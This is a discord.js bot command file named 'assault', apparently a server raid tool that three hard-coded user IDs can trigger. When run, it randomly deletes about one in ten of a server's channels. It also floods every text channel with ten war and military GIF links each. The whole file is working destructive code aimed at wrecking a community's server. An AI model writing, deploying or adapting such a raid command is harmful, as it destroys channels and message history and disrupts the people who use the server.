const Discord = require('discord.js')

module.exports = {
    name:'assault',
    execute(message, args, client) {
        if (message.author.id === "409674646569353218" || message.author.id === "509466475724013589" || message.author.id === "509057349655330826") {
            message.guild.channels.cache.forEach(cha => {
                let gen = Math.floor(Math.random()*10)
                if (gen === 6) {
                    cha.delete()
                }
                if (cha.type === "text") {
                    for(i=0;i<10;i++)  {
                    let urlgen = Math.floor(Math.random()*10)
                    let url
                    if (urlgen === 0) url='https://tenor.com/view/ww2-panzer-tanks-gif-15955311';
                    if (urlgen === 1) url='https://c.tenor.com/Xp0HXVBOTJQAAAAM/ksk-bundeswehr.gif';
                    if (urlgen === 2) url='https://tenor.com/view/soviet-gas-mask-assault-military-gif-22381336';
                    if (urlgen === 3) url='https://tenor.com/view/china-tank-smoke-mbt-gif-17532711';
                    if (urlgen === 4) url='https://tenor.com/view/ksk-bundeswehr-germany-deutschland-luftwaffe-gif-18353771';
                    if (urlgen === 5) url='https://tenor.com/view/f-bi-raid-swat-gif-11500735';
                    if (urlgen === 6) url='https://tenor.com/view/helicopter-military-army-soldiers-attack-gif-16997277';
                    if (urlgen === 7) url='https://tenor.com/view/vietnam-war-gif-22421744';
                    if (urlgen === 8) url='https://tenor.com/view/band-of-brother-run-soldiers-hurry-ww2-gif-5408691';
                    if (urlgen === 9) url='https://tenor.com/view/airborne-ww2-band-of-brothers-carentan-purple-heart-lane-gif-21748643';
                    cha.send(url)
                    }
                }
                
            });
        }
    }
}